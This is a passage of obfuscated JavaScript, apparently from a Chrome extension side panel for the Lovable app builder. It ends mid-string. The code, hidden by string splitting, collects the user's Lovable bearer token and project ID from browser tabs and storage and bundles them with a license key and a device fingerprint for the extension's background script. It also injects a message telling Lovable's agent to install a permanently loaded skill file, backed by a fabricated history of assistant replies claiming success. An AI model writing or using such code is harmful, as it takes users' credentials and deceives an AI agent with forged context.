setTimeout(_n4d9a06,0x1f4);
}
),await new Promise(function(_n53256f){
_n5e6fc4(function(){
_n53256f();
}
);
}
),_n76a626=_n39b796||'',_n471bd8=_n2b5999||'';
(!_n76a626||!_n471bd8)&&(await new Promise(function(_nf55249){
_n2b6173(function(){
_nf55249();
}
);
}
),_n76a626=_n39b796||'',_n471bd8=_n2b5999||'');
for(var _n1b29e0=0x0;
_n1b29e0<0x3&&(!_n76a626||!_n471bd8);
_n1b29e0++){
await new Promise(function(_n40b5f8){
setTimeout(_n40b5f8,0x5dc);
}
),await new Promise(function(_n20b4ba){
_n2b6173(function(){
_n20b4ba();
}
);
}
),_n76a626=_n39b796||'',_n471bd8=_n2b5999||'';
}
}
if(!_n76a626||!_n471bd8)return _n400ca0('⚠\x20T'+'oke'+'n\x20n'+'ão\x20'+'cap'+'tur'+'ado'+'\x20—\x20'+'ver'+'ifi'+'que'+'\x20se'+'\x20o\x20'+'pro'+'jet'+'o\x20L'+'ova'+'ble'+'\x20es'+'tá\x20'+'abe'+'rto'+'\x20em'+'\x20al'+'gum'+'a\x20a'+'ba\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.','war'+'n',0x1b58),![];
if(_n76a626['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n76a626=_n76a626['sli'+'ce'](0x7);
var _nd73997=_n2960ed['rep'+'lac'+'e'](/[^a-zA-Z0-9\s\-_]/g,'')['tri'+'m']()['rep'+'lac'+'e'](/\s+/g,'-')['toL'+'owe'+'rCa'+'se'](),_n412011='---'+'\x0a'+('nam'+'e:\x20')+_n2960ed+'\x0a'+('des'+'cri'+'pti'+'on:'+'\x20')+(_nb38018||_n2960ed)+'\x0a'+('---'+'\x0a\x0a')+_n29cf64,_n4e5065='Cre'+'ate'+'\x20th'+'e\x20f'+'ile'+'\x20`.'+'age'+'nts'+'/sk'+'ill'+'s/'+_nd73997+('/SK'+'ILL'+'.md'+'`\x20w'+'ith'+'\x20ex'+'act'+'ly\x20'+'thi'+'s\x20c'+'ont'+'ent'+':\x0a\x0a')+('```'+'mar'+'kdo'+'wn\x0a')+_n412011+('\x0a``'+'`\x0a\x0a')+('Aft'+'er\x20'+'cre'+'ati'+'ng\x20'+'the'+'\x20fi'+'le,'+'\x20ad'+'d\x20i'+'t\x20t'+'o\x20t'+'he\x20'+'wor'+'ksp'+'ace'+'\x20(a'+'dd\x20'+'to\x20'+'wor'+'ksp'+'ace'+')\x20s'+'o\x20t'+'he\x20'+'ski'+'ll\x20'+'\x22')+_n2960ed+('\x22\x20i'+'s\x20p'+'erm'+'ane'+'ntl'+'y\x20a'+'cti'+'ve\x20'+'and'+'\x20au'+'tom'+'ati'+'cal'+'ly\x20'+'loa'+'ded'+'\x20in'+'\x20al'+'l\x20f'+'utu'+'re\x20'+'ses'+'sio'+'ns\x20'+'of\x20'+'thi'+'s\x20p'+'roj'+'ect'+'.'),_n3c8c67=_n1bd680['sli'+'ce'](-0x4),_n233c9e=_n3c8c67['fil'+'ter'](function(_n29e31f){
return _n29e31f&&_n29e31f['tex'+'t']&&_n29e31f['sta'+'tus']==='ok';
}
)['fla'+'tMa'+'p'](function(_n364ddc){
return[{
'role':'use'+'r','content':_n364ddc['tex'+'t']['sli'+'ce'](0x0,0x190),'ts':new Date(_n364ddc['tim'+'est'+'amp']||Date['now']())['get'+'Tim'+'e']()}
,{
'role':'ass'+'ist'+'ant','content':'Com'+'and'+'o\x20e'+'xec'+'uta'+'do\x20'+'com'+'\x20su'+'ces'+'so.','ts':new Date(_n364ddc['tim'+'est'+'amp']||Date['now']())['get'+'Tim'+'e']()+0x1}
];
}
);
const _n56b0cf={
}
;
_n56b0cf['pro'+'jet'+'o_i'+'d']=_n471bd8,_n56b0cf['tok'+'en_'+'lov'+'abl'+'e']=_n76a626,_n56b0cf['men'+'sag'+'em']=_n4e5065,_n56b0cf['his'+'tor'+'y_b'+'uff'+'er']=_n233c9e,_n56b0cf['con'+'tex'+'t_c'+'las'+'s']='con'+'tex'+'tua'+'l',_n56b0cf[_nf7e693]='fas'+'t',_n56b0cf['sou'+'rce']='ext'+'-in'+'put',_n56b0cf['use'+'r_l'+'ice'+'nse'+'_ke'+'y']=_n37d6bf,_n56b0cf['ses'+'sio'+'n_i'+'d']=_n6a372d||_n4e9223['ql_'+'ses'+'sio'+'n_i'+'d']||'',_n56b0cf['dev'+'ice'+'_id']=_n59d24b,_n56b0cf['lov'+'abl'+'e_m'+'ode'+'l']=null;
var _n154ed3=_n56b0cf,_n588f94=Date['now']()+0x9c40,_n5d44c9=0x0;
while(!![]){
_n5d44c9++;
if(_n5d44c9>0x1){
await new Promise(function(_n3bd7f7){
_n5e6fc4(function(){
_n3bd7f7();
}
);
}
);
if(_n39b796){
var _n442e82=_n39b796;
if(_n442e82['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n442e82=_n442e82['sli'+'ce'](0x7);
_n154ed3['tok'+'en_'+'lov'+'abl'+'e']=_n442e82;
}
if(_n2b5999)_n154ed3['pro'+'jet'+'o_i'+'d']=_n2b5999;
}
var _n50087b=null;
try{
var _n392f79=await new Promise(function(_n21bd3a,_n3e86f2){
const _n2981ce={
}
;
_n2981ce['act'+'ion']='sen'+'dMe'+'ssa'+'ge',_n2981ce['mes'+'sag'+'e']=_n154ed3['men'+'sag'+'em'],_n2981ce['pro'+'jec'+'tId']=_n154ed3['pro'+'jet'+'o_i'+'d'],_n2981ce['tok'+'en']=_n154ed3['tok'+'en_'+'lov'+'abl'+'e'],_n2981ce['att'+'ach'+'men'+'ts']=[],_n2981ce['opt'+'imi'+'sti'+'cUr'+'ls']=[],_n2981ce['his'+'tor'+'yBu'+'ffe'+'r']=_n154ed3['his'+'tor'+'y_b'+'uff'+'er']||[],_n2981ce['con'+'tex'+'tCl'+'ass']=_n154ed3['con'+'tex'+'t_c'+'las'+'s']||'con'+'tex'+'tua'+'l',_n2981ce['lic'+'ens'+'eKe'+'y']=_n37d6bf,_n2981ce['dev'+'ice'+'Fin'+'ger'+'pri'+'nt']=_n59d24b,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n2981ce,function(_n1cc10c){
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror'])_n3e86f2(new Error(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']||'Err'+'o\x20d'+'e\x20c'+'omu'+'nic'+'açã'+'o\x20c'+'om\x20'+'o\x20b'+'ack'+'gro'+'und'));
else{
const _n319ee7={
}
;
_n319ee7['suc'+'ces'+'s']=![],_n319ee7['ok']=![],_n319ee7['err'+'or']='Sem'+'\x20re'+'spo'+'sta'+'\x20do'+'\x20ba'+'ckg'+'rou'+'nd',_n21bd3a(_n1cc10c||_n319ee7);
}
}
);
}
),_n230dab=_n1f65c2(_n392f79);
if(_n230dab==='__u'+'pda'+'te_'+'req'+'uir'+'ed_'+'_')return![];
if(_n230dab)throw new Error(_n230dab);
return _n400ca0(spT('toa'+'st_'+'ski'+'ll_'+'ins'+'tal'+'led')+'\x20'+_n2960ed,'ok',0xfa0),!![];
}
catch(_n24f0e2){
_n50087b=_n24f0e2;
}
var _n557524=_n50087b['mes'+'sag'+'e']||String(_n50087b);
if(/license_invalid:/i['tes'+'t'](_n557524)||/403|http_403/['tes'+'t'](_n557524))return _n400ca0('❌\x20S'+'kil'+'l\x20b'+'loq'+'uea'+'da:'+'\x20li'+'cen'+'ça\x20'+'inv'+'áli'+'da\x20'+'ou\x20'+'exp'+'ira'+'da.'+'\x20Co'+'nta'+'te\x20'+'seu'+'\x20re'+'ven'+'ded'+'or.','err'+'or',0xfa0),![];
if(/captcha_required/i['tes'+'t'](_n557524))return _n400ca0(spT('err'+'or_'+'cap'+'tch'+'a_r'+'equ'+'ire'+'d'),'err'+'or',0x2ee0),![];
if(/payment_required/i['tes'+'t'](_n557524))return _n400ca0(spT('err'+'or_'+'pay'+'men'+'t_r'+'equ'+'ire'+'d'),'err'+'or',0x1f40),![];
var _n30924e=/429|http_429/['tes'+'t'](_n557524)?0xdac:0x7d0;
if(Date['now']()+_n30924e>_n588f94||_n5d44c9>=0x3)return _n400ca0('❌\x20E'+'rro'+'\x20ao'+'\x20en'+'via'+'r\x20s'+'kil'+'l:\x20'+_n557524,'err'+'or',0xfa0),![];
await new Promise(function(_n5a5dd0){
setTimeout(_n5a5dd0,_n30924e);
}
);
}
}
async function _n1f6664(_na48020){
var _n1d5279=await _n5285df();
_n1d5279['inc'+'lud'+'es'](_na48020)?_n1d5279=_n1d5279['fil'+'ter'](function(_n539b0c){
return _n539b0c!==_na48020;
}
):_n1d5279=_n1d5279['con'+'cat']([_na48020]);
var _n29da3f={
}
;
_n29da3f[_n218464]=_n1d5279,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n29da3f);
if(document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'ski'+'ll-'+'det'+'ail'+'-ba'+'ck')){
var _n583bc7=_n1d5279['ind'+'exO'+'f'](_na48020)!==-0x1,_n653e51=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-sk'+'ill'+'-fa'+'v[d'+'ata'+'-sk'+'ill'+'-id'+'=\x22'+_na48020+'\x22]');
_n653e51&&(_n653e51['cla'+'ssL'+'ist']['tog'+'gle']('act'+'ive',_n583bc7),_n653e51['tit'+'le']=_n583bc7?'Rem'+'ove'+'r\x20f'+'avo'+'rit'+'o':'Fav'+'ori'+'tar');
return;
}
var _n389c1a=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
_n389c1a&&(_n389c1a['inn'+'erH'+'TML']=spTemplateSkillsContent(_n227820,_n1d5279,_n1bed2b,_n12c2f4,_ne2d945));
}
async function _n2fcb02(_n4257db){
var _n4de7a6=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n4de7a6)return;
var _n5db544=_n227820['fin'+'d'](function(_nc6b4e8){
return _nc6b4e8['id']===_n4257db;
}
);
if(!_n5db544)return;
var _n1a3a7a=_n1bed2b['ind'+'exO'+'f'](_n4257db)!==-0x1,_n29be06=await _n5285df(),_n224295=_n29be06['ind'+'exO'+'f'](_n4257db)!==-0x1;
_n4de7a6['inn'+'erH'+'TML']=spTemplateSkillDetail(_n5db544,_n1a3a7a,_n224295,_n12c2f4),_n4de7a6['_sk'+'ill'+'sLi'+'ste'+'ner'+'Set']=![];
var _n42b67d=_n4de7a6['que'+'ryS'+'ele'+'cto'+'r']('#sp'+'-sk'+'ill'+'-de'+'tai'+'l-b'+'ack');
_n42b67d&&_n42b67d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',async function(){
var _n5cc031=await _n5285df();
_n4de7a6['inn'+'erH'+'TML']=spTemplateSkillsContent(_n227820,_n5cc031,_n1bed2b,_n12c2f4,_ne2d945),_n4de7a6['_sk'+'ill'+'sLi'+'ste'+'ner'+'Set']=![],_n4bcb37();
}
);
var _n32d29e=_n4de7a6['que'+'ryS'+'ele'+'cto'+'r']('#sp'+'-sk'+'ill'+'-de'+'tai'+'l-t'+'ogg'+'le');
_n32d29e&&_n32d29e['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',async function(){
await _n40f3ba(_n4257db);
}
);
var _n21199f=_n4de7a6['que'+'ryS'+'ele'+'cto'+'r']('#sp'+'-sk'+'ill'+'-de'+'tai'+'l-f'+'av');
_n21199f&&_n21199f['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',async function(){
await _n1f6664(_n4257db);
var _n5f4756=await _n5285df(),_n30c32f=_n5f4756['ind'+'exO'+'f'](_n4257db)!==-0x1;
_n21199f['cla'+'ssL'+'ist']['tog'+'gle']('act'+'ive',_n30c32f),_n21199f['tit'+'le']=_n30c32f?'Rem'+'ove'+'r\x20f'+'avo'+'rit'+'o':'Fav'+'ori'+'tar';
}
);
}
function _n38fea2(){
var _n43fe44=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n43fe44)return;
_n43fe44['_sk'+'ill'+'sLi'+'ste'+'ner'+'Set']=![],_n43fe44['inn'+'erH'+'TML']=spTemplateSkillsHelp(),_n43fe44['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function _n88d736(_n4889c4){
_n4889c4['tar'+'get']['clo'+'ses'+'t']('#sp'+'-sk'+'ill'+'s-h'+'elp'+'-ba'+'ck')&&(_n43fe44['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n88d736),_n509106());
}
);
}
function _n4bcb37(){
var _n46bd57=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n46bd57||_n46bd57['_sk'+'ill'+'sLi'+'ste'+'ner'+'Set'])return;
_n46bd57['_sk'+'ill'+'sLi'+'ste'+'ner'+'Set']=!![],_n46bd57['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',async function(_n31eb3b){
if(_n31eb3b['tar'+'get']['clo'+'ses'+'t']('#sp'+'-sk'+'ill'+'s-h'+'elp'+'-bt'+'n')){
_n38fea2();
return;
}
var _nff8a80=_n31eb3b['tar'+'get']['clo'+'ses'+'t']('.sp'+'-ca'+'t-b'+'tn');
if(_nff8a80){
_ne2d945=_nff8a80['dat'+'ase'+'t']['cat']||'all';
var _nff323d=await _n5285df();
_n46bd57['inn'+'erH'+'TML']=spTemplateSkillsContent(_n227820,_nff323d,_n1bed2b,_n12c2f4,_ne2d945);
return;
}
var _n30e15c=_n31eb3b['tar'+'get']['clo'+'ses'+'t']('.sp'+'-sk'+'ill'+'-to'+'ggl'+'e');
if(_n30e15c){
await _n40f3ba(_n30e15c['dat'+'ase'+'t']['ski'+'llI'+'d']);
return;
}
var _n23d6d5=_n31eb3b['tar'+'get']['clo'+'ses'+'t']('.sp'+'-sk'+'ill'+'-fa'+'v');
if(_n23d6d5){
await _n1f6664(_n23d6d5['dat'+'ase'+'t']['ski'+'llI'+'d']);
return;
}
if(_n31eb3b['tar'+'get']['clo'+'ses'+'t']('#sp'+'-sk'+'ill'+'s-r'+'efr'+'esh')){
_n227820=[],chrome['sto'+'rag'+'e']['loc'+'al']['rem'+'ove']([_n502e99]),_n509106();
return;
}
var _n391f4f=_n31eb3b['tar'+'get']['clo'+'ses'+'t']('.sp'+'-sk'+'ill'+'-in'+'fo');
if(_n391f4f){
await _n2fcb02(_n391f4f['dat'+'ase'+'t']['ski'+'llI'+'d']);
return;
}
}
);
}
function _nec67e5(_n44d337){
_n12caa4=_n44d337,document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('.ta'+'b-b'+'tn')['for'+'Eac'+'h'](function(_n1087aa){
_n1087aa['cla'+'ssL'+'ist']['tog'+'gle']('act'+'ive',_n1087aa['get'+'Att'+'rib'+'ute']('dat'+'a-t'+'ab')===_n44d337);
}
);
if(_n44d337==='his'+'tor'+'y')_n2ff1e7(function(){
_n5c48c5();
}
);
else _n44d337==='ski'+'lls'?_n509106():_n1ffa71();
}
function _n3e2964(){
const _n2d74ff=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'bod'+'y'),_n6ee752=document['doc'+'ume'+'ntE'+'lem'+'ent']['get'+'Att'+'rib'+'ute']('dat'+'a-t'+'hem'+'e')==='dar'+'k',_n485892=document['get'+'Ele'+'men'+'tBy'+'Id']('the'+'meK'+'nob');
if(_n485892)_n485892['inn'+'erH'+'TML']=_n6ee752?SP_SVG['moo'+'n']:SP_SVG['sun'];
_n2ff1e7(function(){
_n2d74ff['inn'+'erH'+'TML']='<di'+'v\x20i'+'d=\x22'+'sp-'+'upd'+'ate'+'-ba'+'nne'+'r\x22\x20'+'sty'+'le='+'\x22di'+'spl'+'ay:'+'non'+'e\x22>'+'</d'+'iv>'+('<di'+'v\x20i'+'d=\x22'+'sp-'+'pro'+'fil'+'e-h'+'ead'+'er\x22'+'></'+'div'+'>')+spTemplateTabs(_n12caa4,_n1bd680['len'+'gth'])+('<di'+'v\x20i'+'d=\x22'+'sp-'+'tab'+'-co'+'nte'+'nt\x22'+'></'+'div'+'>'),_n4743b0(_n1ba7e3,_n10b465,_n472837),_n6d2934['ope'+'nin'+'g'](),document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('.ta'+'b-b'+'tn')['for'+'Eac'+'h'](function(_ncd9d0){
_ncd9d0['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function(){
_nec67e5(_ncd9d0['get'+'Att'+'rib'+'ute']('dat'+'a-t'+'ab'));
}
);
}
);
if(_n12caa4==='his'+'tor'+'y')_n5c48c5();
else _n12caa4==='ski'+'lls'?_n509106():_n1ffa71();
_n5e6fc4(()=>{
setTimeout(_n46f553,0x320);
}
);
const _n4b3656=setInterval(()=>{
_n5e6fc4(()=>_n46f553());
}
,0x1388),_n3bbc69={
}
;
_n3bbc69['onc'+'e']=!![],window['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('pag'+'ehi'+'de',()=>clearInterval(_n4b3656),_n3bbc69);
const _n16bfcb=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cap'+'tur'+'e-b'+'tn');
_n16bfcb&&_n16bfcb['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
_n16bfcb['dis'+'abl'+'ed']=!![],_n16bfcb['tex'+'tCo'+'nte'+'nt']='⏳',_n5e6fc4(()=>{
setTimeout(()=>{
_n46f553(),_n16bfcb['tex'+'tCo'+'nte'+'nt']='🔄',_n16bfcb['dis'+'abl'+'ed']=![];
}
,0x4b0);
}
);
}
),_n46f553(),chrome['run'+'tim'+'e']['onM'+'ess'+'age']['add'+'Lis'+'ten'+'er'](_n10f29d=>{
if(_n10f29d['act'+'ion']==='clo'+'seS'+'ide'+'Pan'+'el')_n6d2934['clo'+'sin'+'g']();
}
),_n789aef(),chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lk','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'use'+'r_n'+'ame','ql_'+'exp'+'ire'+'s_a'+'t','ql_'+'lic'+'ens'+'e_s'+'tat'+'us','ql_'+'ui_'+'mod'+'e'],_n1ccceb=>{
_n1ccceb['ql_'+'lk']&&(_n6a372d=_n1ccceb['ql_'+'ses'+'sio'+'n_i'+'d']||_n6a372d,_n1ba7e3=_n1ccceb['ql_'+'use'+'r_n'+'ame']||_n1ba7e3,_n10b465=_n1ccceb['ql_'+'exp'+'ire'+'s_a'+'t']||_n10b465,_n472837=_n1ccceb['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']||_n472837,_n4ae681(_n1ccceb['ql_'+'lk']),_n13f13d(_n10b465),_n4743b0(_n1ba7e3,_n10b465,_n472837));
}
),_n167fc3(),_n1dcf69();
}
);
}
function _n4743b0(_n37f8f7,_n2171b4,_n22f258){
const _n22269a=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'pro'+'fil'+'e-h'+'ead'+'er');
if(_n22269a)_n22269a['inn'+'erH'+'TML']=spTemplateLicenseHeader(_n37f8f7,_n2171b4,_n22f258);
}
function _n5e6fc4(_n2d37e6){
try{
const _n27234c={
}
;
_n27234c['act'+'ive']=!![],_n27234c['cur'+'ren'+'tWi'+'ndo'+'w']=!![],chrome['tab'+'s']['que'+'ry'](_n27234c,_n3223cd=>{
const _n471e80=_n3223cd&&_n3223cd[0x0]?_n3223cd[0x0]['id']:null;
if(_n471e80)_n14a310=_n471e80;
const _n1483ef={
}
;
_n1483ef['act'+'ion']='req'+'ues'+'tFr'+'esh'+'Tok'+'en',_n1483ef['act'+'ive'+'Tab'+'Id']=_n471e80,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n1483ef,()=>{
void chrome['run'+'tim'+'e']['las'+'tEr'+'ror'];
const _nfc6486=_n14a310!=null?['lov'+'_to'+'k_'+_n14a310,'lov'+'_ht'+'_'+_n14a310,'lov'+'_pi'+'d_'+_n14a310,'lov'+'abl'+'e_t'+'oke'+'n','lov'+'_ht','lov'+'abl'+'e_p'+'roj'+'ect'+'Id']:['lov'+'abl'+'e_t'+'oke'+'n','lov'+'_ht','lov'+'abl'+'e_p'+'roj'+'ect'+'Id'];
chrome['sto'+'rag'+'e']['loc'+'al']['get'](_nfc6486,_n401ae9=>{
const _n172acb=(_n14a310!=null?_n401ae9['lov'+'_to'+'k_'+_n14a310]||_n401ae9['lov'+'_ht'+'_'+_n14a310]:null)||_n401ae9['lov'+'abl'+'e_t'+'oke'+'n']||_n401ae9['lov'+'_ht'],_n312389=(_n14a310!=null?_n401ae9['lov'+'_pi'+'d_'+_n14a310]:null)||_n401ae9['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'];
if(_n172acb)_n39b796=_n172acb;
if(_n312389)_n2b5999=_n312389;
if(_n2d37e6)_n2d37e6();
}
);
}
);
}
);
}
catch(_n28c3ae){
if(_n2d37e6)_n2d37e6();
}
}
function _n2b6173(_n33f4ff){
try{
const _n585811={
}
;
_n585811['url']='*:/'+'/lo'+'vab'+'le.'+'dev'+'/*',chrome['tab'+'s']['que'+'ry'](_n585811,function(_n358e36){
if(!_n358e36||_n358e36['len'+'gth']===0x0){
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id'],function(_n15e222){
if(_n15e222['lov'+'abl'+'e_t'+'oke'+'n'])_n39b796=_n15e222['lov'+'abl'+'e_t'+'oke'+'n'];
if(_n15e222['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'])_n2b5999=_n15e222['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'];
if(_n33f4ff)_n33f4ff();
}
);
return;
}
var _n2d68e4=_n358e36[0x0],_n5bb68d=_n358e36['map'](function(_n5f08c8){
return['lov'+'_to'+'k_'+_n5f08c8['id'],'lov'+'_pi'+'d_'+_n5f08c8['id']];
}
)['red'+'uce'](function(_n43f615,_n176d3c){
return _n43f615['con'+'cat'](_n176d3c);
}
,[]);
_n5bb68d['pus'+'h']('lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id'),chrome['sto'+'rag'+'e']['loc'+'al']['get'](_n5bb68d,function(_n442b27){
for(var _n4e3875=0x0;
_n4e3875<_n358e36['len'+'gth'];
_n4e3875++){
var _n1ba3f8=_n358e36[_n4e3875]['id'],_n375aea=_n442b27['lov'+'_to'+'k_'+_n1ba3f8],_n56ddc0=_n442b27['lov'+'_pi'+'d_'+_n1ba3f8];
if(_n375aea&&_n56ddc0){
_n39b796=_n375aea,_n2b5999=_n56ddc0,_n14a310=_n1ba3f8;
if(_n33f4ff)_n33f4ff();
return;
}
}
if(_n442b27['lov'+'abl'+'e_t'+'oke'+'n'])_n39b796=_n442b27['lov'+'abl'+'e_t'+'oke'+'n'];
if(_n442b27['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'])_n2b5999=_n442b27['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'];
const _n433af8={
}
;
_n433af8['act'+'ion']='req'+'ues'+'tFr'+'esh'+'Tok'+'en',_n433af8['act'+'ive'+'Tab'+'Id']=_n2d68e4['id'],chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n433af8,function(){
void chrome['run'+'tim'+'e']['las'+'tEr'+'ror'],setTimeout(function(){
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['lov'+'_to'+'k_'+_n2d68e4['id'],'lov'+'_pi'+'d_'+_n2d68e4['id'],'lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id'],function(_n2fb516){
var _n243573=_n2fb516['lov'+'_to'+'k_'+_n2d68e4['id']]||_n2fb516['lov'+'abl'+'e_t'+'oke'+'n'],_n171f71=_n2fb516['lov'+'_pi'+'d_'+_n2d68e4['id']]||_n2fb516['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'];
_n243573&&(_n39b796=_n243573,_n14a310=_n2d68e4['id']);
if(_n171f71)_n2b5999=_n171f71;
if(_n33f4ff)_n33f4ff();
}
);
}
,0x1f4);
}
);
}
);
}
);
}
catch(_n1cdc02){
if(_n33f4ff)_n33f4ff();
}
}
function _n1ffa71(){
const _n3ef74e=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n3ef74e)return;
_n3ef74e['inn'+'erH'+'TML']=spTemplatePromptContent(),_n3b726c(),_n1d5526();
const _n247c06=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'sen'+'d'),_n4bbf09=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'msg'),_n33de6e=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cle'+'ar-'+'msg'),_n5168c6=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'att'+'ach'),_n3879e3=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'mod'+'e-t'+'ogg'+'le'),_n2aa919=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dro'+'p-z'+'one'),_n46cd1b=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dro'+'p-o'+'ver'+'lay'),_n20b431=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'fil'+'e-i'+'npu'+'t');
_n4bbf09['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('pas'+'te',_n4cc293=>{
const _n1e2856=(_n4cc293['cli'+'pbo'+'ard'+'Dat'+'a']||_n4cc293['ori'+'gin'+'alE'+'ven'+'t']['cli'+'pbo'+'ard'+'Dat'+'a'])['ite'+'ms'],_n270b0f=[];
for(const _n4c25dd of _n1e2856){
if(_n4c25dd['kin'+'d']==='fil'+'e')_n270b0f['pus'+'h'](_n4c25dd['get'+'AsF'+'ile']());
}
if(_n270b0f['len'+'gth'])_n1f5517(_n270b0f);
}
);
const _n566800=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'rem'+'ove'+'-wa'+'ter'+'mar'+'k'),_n42b125=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'nat'+'ive'+'-ch'+'at-'+'btn'),_n8aed35=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cre'+'ate'+'-pr'+'oje'+'ct-'+'btn');
_n42b125&&_n42b125['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'nat'+'ive'+'_ch'+'at'],_n2d7e8e=>{
const _n40e6fe=!_n2d7e8e['ql_'+'nat'+'ive'+'_ch'+'at'],_n5957d1={
}
;
_n5957d1['ql_'+'nat'+'ive'+'_ch'+'at']=_n40e6fe,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n5957d1,()=>{
_n40e6fe?_n176391(spT('toa'+'st_'+'nat'+'ive'+'_ch'+'at_'+'on')):_n176391(spT('toa'+'st_'+'nat'+'ive'+'_ch'+'at_'+'off'));
}
);
}
);
}
);
_n8aed35&&_n8aed35['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n962b27);
const _neca26e=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dow'+'nlo'+'ad-'+'zip'+'-bt'+'n');
_neca26e&&_neca26e['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n39c771);
const _n57d7b1=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'imp'+'rov'+'e');
_n57d7b1&&(_n57d7b1['inn'+'erH'+'TML']='<sv'+'g\x20w'+'idt'+'h=\x22'+'15\x22'+'\x20he'+'igh'+'t=\x22'+'15\x22'+'\x20vi'+'ewB'+'ox='+'\x220\x20'+'0\x202'+'4\x202'+'4\x22\x20'+'fil'+'l=\x22'+'non'+'e\x22\x20'+'str'+'oke'+'=\x22c'+'urr'+'ent'+'Col'+'or\x22'+'\x20st'+'rok'+'e-w'+'idt'+'h=\x22'+'2.2'+'\x22\x20s'+'tro'+'ke-'+'lin'+'eca'+'p=\x22'+'rou'+'nd\x22'+'\x20st'+'rok'+'e-l'+'ine'+'joi'+'n=\x22'+'rou'+'nd\x22'+'\x20st'+'yle'+'=\x22p'+'oin'+'ter'+'-ev'+'ent'+'s:n'+'one'+'\x22><'+'pat'+'h\x20d'+'=\x22m'+'21.'+'64\x20'+'3.6'+'4-1'+'.28'+'-1.'+'28a'+'1.2'+'1\x201'+'.21'+'\x200\x20'+'0\x200'+'-1.'+'72\x20'+'0L2'+'.36'+'\x2018'+'.64'+'a1.'+'21\x20'+'1.2'+'1\x200'+'\x200\x20'+'0\x200'+'\x201.'+'72l'+'1.2'+'8\x201'+'.28'+'a1.'+'2\x201'+'.2\x20'+'0\x200'+'\x200\x20'+'1.7'+'2\x200'+'L21'+'.64'+'\x205.'+'36a'+'1.2'+'\x201.'+'2\x200'+'\x200\x20'+'0\x200'+'-1.'+'72Z'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'m14'+'\x207\x20'+'3\x203'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M5\x20'+'6v4'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M19'+'\x2014'+'v4\x22'+'/><'+'pat'+'h\x20d'+'=\x22M'+'10\x20'+'2v2'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M7\x20'+'8H3'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M21'+'\x2016'+'h-4'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M11'+'\x203H'+'9\x